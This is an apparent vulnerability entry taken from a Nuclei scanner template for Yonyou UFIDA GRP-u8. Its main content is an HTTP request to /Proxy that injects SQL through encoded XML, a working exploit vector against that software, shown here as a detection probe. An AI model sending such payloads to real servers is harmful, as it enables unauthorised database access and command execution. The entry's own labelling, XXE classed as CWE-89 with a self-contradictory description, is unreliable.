# Vulnerability: Yonyou UFIDA GRP-u8 - XXE
**Classification:** CWE-89
**Source:** Nuclei Template (`yonyou-grp-u8-xxe.yaml`)

## Description
UFIDA GRP-u8 has an XXE vulnerability. This vulnerability is caused by the application not loading external entities when parsing XML input, resulting in the loading of external SQL statements and command execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Proxy HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

cVer=9.8.0&dp=%3c?xml%20version%3d%221.0%22%20encoding%3d%22GB2312%22?%3e%3cR9PACKET%20version%3d%221%22%3e%3cDATAFORMAT%3eXML%3c%2fDATAFORMAT%3e%3cR9FUNCTION%3e%3cNAME%3eAS_DataRequest%3c%2fNAME%3e%3cPARAMS%3e%3cPARAM%3e%3cNAME%3eProviderName%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3eDataSetProviderData%3c%2fDATA%3e%3c%2fPARAM%3e%3cPARAM%3e%3cNAME%3eData%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3e%20select%20{{num1}}%2a{{num2}}%20%3c%2fDATA%3e%3c%2fPARAM%3e%3c%2fPARAMS%3e%3c%2fR9FUNCTION%3e%3c%2fR9PACKET%3e
```

